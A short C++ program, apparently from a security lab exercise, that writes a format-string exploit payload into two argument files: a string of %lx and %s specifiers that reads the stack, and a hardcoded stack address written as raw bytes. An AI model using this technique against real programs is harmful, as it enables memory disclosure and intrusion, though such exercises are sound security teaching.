#include <iostream>
#include <fstream>

typedef unsigned int uint;

void writeShellCode1()
{
	std::ofstream file("args/arg1");

	file << "%lx %lx %lx %lx %lx %lx %lx |%s| %lx %lx %lx\n";
	file.close();
}

void writeShellCode2()
{
	std::ofstream file("args/arg2");
	uint64_t addr = 0x7fffffffe570;

	for (int i = 0; i < 8; i++)
		file << ((char *)(&addr))[i];
	file.close();
}

int main(int argc, char const *argv[])
{
	writeShellCode1();
	writeShellCode2();
	return 0;
}
